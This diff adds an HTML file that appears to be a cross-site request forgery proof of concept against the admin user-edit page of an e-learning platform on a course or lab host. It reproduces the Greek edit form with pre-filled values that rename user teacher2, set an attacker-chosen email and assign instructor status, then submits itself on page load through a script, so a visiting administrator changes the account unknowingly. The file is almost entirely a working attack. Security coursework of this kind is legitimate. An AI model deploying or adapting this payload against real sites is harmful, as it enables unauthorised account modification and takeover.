@@ -1,0 +1,83 @@
+<form id='csrf_form' action='http://Eponymous.csec.gr/modules/admin/edituser.php' method='post'>
+
+
+<table class='FormData' width='99%' align='left'>
+  <tbody>
+  <tr>
+    <th width='220'>&nbsp;</th>
+    <td><b>Επεξεργασία στοιχείων χρήστη teacher2</b></td>
+  </tr>
+  <tr>
+    <th class='left'>Επώνυμο:</th>
+    <td><input type='text' name='lname' size='50' value='teacher2edited' /></td>
+  </tr>
+  <tr>
+    <th class='left'>Όνομα:</th>
+  <td><input type='text' name='fname' size='50' value='teacher2' /></td>
+  </tr>
+  <tr>
+    <th class='left'>Όνομα χρήστη (username):</th>
+    <td><input type='text' name='username' size='50' value='teacher2' /></td>
+  </tr>
+  <tr>
+    <th class='left'>e-mail: </th>
+    <td><input type='text' name='email' size='50' value='xss@di.uoa.gr' /></td>
+  </tr>
+  <tr>
+    <th class='left'>Αριθμός μητρώου: </th>
+    <td><input type='text' name='am' size='50' value='' /></td>
+  </tr>
+ <tr>
+   <th class='left'>Τηλ.: </th>
+   <td><input type='text' name='phone' size='50' value='' /></td>
+  </tr><tr>
+    <th class='left'>Σχολή / Τμήμα:</th>
+    <td>
+<select name='department'  class='auth_input'>
+<option selected value='1'>Τμήμα 1</option>
+<option value='2'>Τμήμα 2</option>
+<option value='4'>Τμήμα 4</option>
+</select>
+</td></tr><tr><th class='left'>Ιδιότητα:</th><td>
+<select name='newstatut'  class='auth_input'>
+<option selected value='1'>Εκπαιδευτής</option>
+<option value='5'>Εκπαιδευόμενος</option>
+</select>
+</td><tr>
+    <th class='left'>Ημερομηνία εγγραφής:</th>
+    <td><span style='color:green;font-weight:bold;'>17/4/2018 00:53</span></td>
+  </tr>
+  <tr>
+    <th class='left'>Ημερομηνία λήξης: </th>
+    <td><input style="width: 15em; color: #840; background-color: #ff8; border: 1px solid #000; text-align: center" name="date" value="16-4-2022" id="f-calendar-field-1" type="text" /><a href="#" id="f-calendar-trigger-1"><img align="middle" border="0" src="http://eponymous.csec.gr/include/jscalendar/img.gif" alt="" /></a><script type="text/javascript">Calendar.setup({"ifFormat": "%d-%m-%Y","daFormat": "%Y/%m/%d","showOthers":true,"align": "Tl","inputField": "f-calendar-field-1","button": "f-calendar-trigger-1"});</script>&nbsp;&nbsp;&nbsp;<select name='hour'>
+          <option value='00'>00</option>
+          <option value='--'>--</option><option value='0'>0</option><option value='1'>1</option><option value='2'>2</option><option value='3'>3</option><option value='4'>4</option><option value='5'>5</option><option value='6'>6</option><option value='7'>7</option><option value='8'>8</option><option value='9'>9</option><option value='10'>10</option><option value='11'>11</option><option value='12'>12</option><option value='13'>13</option><option value='14'>14</option><option value='15'>15</option><option value='16'>16</option><option value='17'>17</option><option value='18'>18</option><option value='19'>19</option><option value='20'>20</option><option value='21'>21</option><option value='22'>22</option><option value='23'>23</option><option value='24'>24</option></select>&nbsp;&nbsp;&nbsp;<select name='minute'>
+                          <option value='53'>53</option>
+                          <option value='--'>--</option><option value='0'>0</option><option value='5'>5</option><option value='10'>10</option><option value='15'>15</option><option value='20'>20</option><option value='25'>25</option><option value='30'>30</option><option value='35'>35</option><option value='40'>40</option><option value='45'>45</option><option value='50'>50</option><option value='55'>55</option></select></td>
+  </tr>
+  <tr>
+    <th class='left'>Αριθμός χρήστη: </th>
+    <td>25</td>
+  </tr>
+  <tr>
+    <th class='left'>&nbsp;</th>
+    <td>
+      <input type='hidden' name='u' value='25' />
+      <input type='hidden' name='u_submitted' value='1' />
+      <input type='hidden' name='registered_at' value='1523915586' />
+      <input type='text' name='submit_edituser' value='Αλλαγή' />
+    </td>
+  </tr>
+  <tr>
+    <td colspan='2'>&nbsp;</td>
+  </tr>
+  </tbody>
+  </table>
+
+
+  <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
